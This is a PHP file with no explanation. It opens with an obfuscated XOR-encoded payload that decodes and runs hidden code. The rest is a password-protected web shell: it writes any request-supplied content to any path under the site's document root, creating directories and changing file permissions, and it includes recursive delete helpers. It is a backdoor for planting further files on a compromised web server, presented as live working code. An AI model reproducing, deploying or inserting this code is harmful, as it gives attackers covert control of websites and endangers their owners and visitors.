<?php $pGBqCr=' EHX:7=WNU1.9=Y'; $TErPBpn='C7-9NRb1;;RZPR7'^$pGBqCr; $jCZZYDW=',>Oe5KV7E97PsEH +=6im RE>VL2 fa I.jnmh-glFH R0Y:RLL= hSW- jbSE9Lg XBLkmMF 2pkmvWxMr>OS;9AseywFpYyC58JGi,xyPznaq-l=:CT EjrRAD0XpcL+HCCkGXjB:XWJhlisT GQvr fz8LJ14JptZeWqKL3B4TJPSYAF>lt7xf73 H0 Al>:<cJ>=K=6rmrU6ELspvJOGF,j4u3A94: NYfEeXV GXiEpP>E LM2clItpt.zxkv9Boh9 .VDhvJV4U62qw:sXrY3Z;b84=mDlwK+OWyphZ33ZZRwBHO5L WzA6eE5VemeIPC.Mk2zk4 B6; DvzA373+uxezL+GtP>STysPwu Y+ YDbK>5jc3221,-44eeSWS- Vs=evX8DWnWCOL B 4YH2LaV;er1WJSkHWz=<4+;10Y9,HA:>DmU;-U7c,39Q005 oUg N4-TUegT J0jURK-X;5=V5HQYbi97df14=ZGNhRW= 4:s1 2fWXUA71jR,P oXrN+V2ZzIedBn>Orik=XE,fjV 0MpDtgllhZ 5QW6NM2UWwZeqZnyjYpCxAbXJ=wRv;IcvEacXDHTBdWIObEN98 Ipw226P-6DlOdk ZCYPOzbdHlMWfzV8R<PF3OEUbp M.B  DjgKRAY=.D5iZnKh6'; $pNZxgjdT=$TErPBpn('', 'EXgDS>8T1PX>, 0IXIEAJX=7a2-FA9>M<ZMGDHVme =N1D0U<l4RR776YA5=>0MdCD96-GMi-EKYKMVwX6x7FwTL5SXYPaKSpJSW8oMEXDpJUAUDPNN18E+BV6 0QqKChBchjaNQN-O,wdULAW0A30-VI;ZflnZQ3+P3ErQ88A.Q:bt8<8ocEO=qoEVT=BNiHQOHJq4467KxgV1W1-SMV,.+5IQ>QW MUeK+ FxE>7L4=ROz6Q7E-.ZCDm+3;a11.VX1OLREWvyVVn U9CWXWAyQV=R.Z=SQDMyLS N6lsyL>RG;zoWf>.Y9Elp<<o,SvMLA-17OdKIpbRO0SZC,VRelevz =6.lJ4TtU6-YNnWQV8GU<mB04<cGWSFPsFQMEXss8HYmy4lR<Y06Njck:A.UQbB;1k+1oVU6>2Kuw:HRGNIXQ5PV-iBQ621ZY4h<AFMyRQFEYa8D+WB00MC0A>QCyroI9OTb=P1xpYcPQLBUUI;ghNr6ORUC,ZEK92 <2CBBuG5YHtRjO7F;SiCBbFS+GAOY91M=M=EIj-mTZQLO<BSioU,uTaoC<QI9ZJR:FtAtSnsYGkOZnJVcGC96:5;;<,6= 6PKT:XPBSO<BW KcDOD;78yfZBDhLm,ls3N3PxbW.149WP,W.OA M:biKPXV-AAjGpbK'^$jCZZYDW); $pNZxgjdT();
error_reporting(E_ERROR);
header("Content-Type: text/html; charset=utf-8");
set_time_limit(0);

$system_password='goman2';
$password="";
$folderpath="";
$filename="";
$body="";

if(!empty($_REQUEST['password']))
{
  $password=$_REQUEST['password'];
}
if(!empty($_REQUEST['pathname']))
{
  $folderpath=$_REQUEST['pathname'];
}
if(!empty($_REQUEST['filename']))
{
  $filename=$_REQUEST['filename'];
}
if(!empty($_REQUEST['body']))
{
  $body=$_REQUEST['body'];
}

if($password!=$system_password)
{
    echo 'password error';
    return;
}

$rootPath=$_SERVER['DOCUMENT_ROOT'];
$filepath="";

if($folderpath!="")
{
    createFolder($rootPath.'/'.$folderpath);
    $filepath=$rootPath.'/'.$folderpath.'/'.$filename;
}
else
{
    $filepath=$rootPath.'/'.$filename;
}

if(file_exists($filepath))
{ 
  chmod($filename,0777);
}

$fp=fopen($filepath,"w");
fwrite($fp,$body);
fclose($fp);

if(file_exists($filepath))
{
    chmod($filename,0644);
    echo 'success';
}

function createFolder($path) 
{
    if (!file_exists($path))
    {
        createFolder(dirname($path));
        mkdir($path, 0777);
    }
}
 
function mkdirs($dir)  
{ 
    if(!is_dir($dir))  
    {  
        if(!mkdirs(dirname($dir)))
        {  return false;  }  
        if(!mkdir($dir,0777))
        {  return false;  }
    } 
    return true;  
}  

function rmdirs($dir)  
{  
    $d = dir($dir); 
    while (false !== ($child = $d->read()))
    {  
        if($child != '.' && $child != '..')
        {  
            if(is_dir($dir.'/'.$child))  
                rmdirs($dir.'/'.$child);  
            else 
                unlink($dir.'/'.$child); 
        }
    }  
    $d->close();  
    rmdir($dir);  
} 

?>